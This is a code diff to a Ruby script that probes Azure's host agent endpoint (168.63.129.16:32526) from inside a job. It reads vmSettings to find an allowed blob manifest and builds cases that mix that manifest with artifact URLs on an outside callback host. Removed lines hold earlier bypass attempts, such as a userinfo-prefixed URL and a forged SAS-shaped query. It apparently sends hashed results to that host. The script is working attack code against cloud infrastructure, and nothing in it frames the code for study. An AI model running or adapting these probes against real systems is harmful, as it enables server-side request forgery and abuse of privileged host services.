@@ -5,7 +5,6 @@ require "tempfile"
 
 AZURE_FETCH_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443"
 AZURE_HGAP_HTTPS_BASE = "https://target.147.182.179.38.sslip.io"
-AZURE_HGAP_HTTP_BASE = "http://output.147.182.179.38.sslip.io"
 AZURE_FETCH_MARKER = "5b3963e04627c6a3b1943eb0e2a145cc"
 
 def azure_fetch_post(job_id, data, kind = "runtime-summary")
@@ -83,30 +82,44 @@ if job_id.match?(/\A[0-9]+\z/)
         "x-ms-host-config-name: #{config_name}"
       ]
       callback_path = "/hgap/#{AZURE_FETCH_MARKER}/#{job_id}"
-      cases = {
-        "https-standard" => {
-          "artifact" => "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/https-standard",
-          "manifest" => "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/https-standard"
-        },
-        "http-standard" => {
-          "artifact" => "#{AZURE_HGAP_HTTP_BASE}#{callback_path}/http-standard",
-          "manifest" => "#{AZURE_HGAP_HTTP_BASE}#{callback_path}/http-standard"
-        },
-        "https-userinfo" => {
-          "artifact" => "https://example.blob.core.windows.net@target.147.182.179.38.sslip.io#{callback_path}/https-userinfo",
-          "manifest" => "https://example.blob.core.windows.net@target.147.182.179.38.sslip.io#{callback_path}/https-userinfo",
-          "outer_headers" => ["Metadata: true", "X-HGAP-Marker: #{Digest::SHA256.hexdigest(job_id)}"]
-        },
-        "https-storage-shape" => {
-          "artifact" => "https://target.147.182.179.38.sslip.io#{callback_path}/https-storage-shape?sv=2018-03-28&sr=b&sp=r&se=2099-01-01T00%3A00%3A00Z&sig=AAAA",
-          "manifest" => "https://target.147.182.179.38.sslip.io#{callback_path}/https-storage-shape?sv=2018-03-28&sr=b&sp=r&se=2099-01-01T00%3A00%3A00Z&sig=AAAA"
-        }
-      }
 
       versions_status, versions_body = azure_fetch_proxy_get(
         "http://168.63.129.16:32526/versions",
         headers: ["x-ms-containerid: #{container_id}"]
       )
+
+      correlation_hex = Digest::SHA256.hexdigest("#{job_id}:#{Process.pid}:#{Time.now.to_f}")[0, 32]
+      correlation_id = [
+        correlation_hex[0, 8], correlation_hex[8, 4], correlation_hex[12, 4],
+        correlation_hex[16, 4], correlation_hex[20, 12]
+      ].join("-")
+      vmsettings_status, vmsettings_body = azure_fetch_proxy_get(
+        "http://168.63.129.16:32526/vmSettings",
+        headers: base_headers + ["x-ms-client-correlationid: #{correlation_id}"]
+      )
+      vmsettings = JSON.parse(vmsettings_body) rescue {}
+      allowed_manifest = Array(vmsettings.dig("gaFamilies", 0, "uris")).find do |uri|
+        uri.is_a?(String) && uri.match?(%r{\Ahttps://[a-z0-9-]+\.blob\.core\.windows\.net/[^\r\n]{1,480}\z})
+      end
+      owned_url = "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/allowed-manifest-owned-artifact"
+      cases = {}
+      if allowed_manifest
+        cases = {
+          "allowed-control" => {
+            "artifact" => allowed_manifest,
+            "manifest" => allowed_manifest
+          },
+          "allowed-manifest-owned-artifact" => {
+            "artifact" => owned_url,
+            "manifest" => allowed_manifest,
+            "outer_headers" => ["Metadata: true", "X-HGAP-Marker: #{Digest::SHA256.hexdigest(job_id)}"]
+          },
+          "owned-manifest-allowed-artifact" => {
+            "artifact" => allowed_manifest,
+            "manifest" => owned_url
+          }
+        }
+      end
 
       negative_status, negative_body = azure_fetch_proxy_get(
         "http://168.63.129.16:32526/extensionArtifact", headers: base_headers
@@ -114,6 +127,11 @@ if job_id.match?(/\A[0-9]+\z/)
       summary["versions_status"] = versions_status
       summary["versions_length"] = versions_body.bytesize
       summary["versions_sha256"] = Digest::SHA256.hexdigest(versions_body)
+      summary["vmsettings_status"] = vmsettings_status
+      summary["vmsettings_length"] = vmsettings_body.bytesize
+      summary["vmsettings_sha256"] = Digest::SHA256.hexdigest(vmsettings_body)
+      summary["allowed_manifest_present"] = !allowed_manifest.nil?
+      summary["allowed_manifest_sha256"] = allowed_manifest ? Digest::SHA256.hexdigest(allowed_manifest) : ""
       summary["negative_missing_location_status"] = negative_status
       summary["negative_missing_location_length"] = negative_body.bytesize
       summary["negative_missing_location_sha256"] = Digest::SHA256.hexdigest(negative_body)
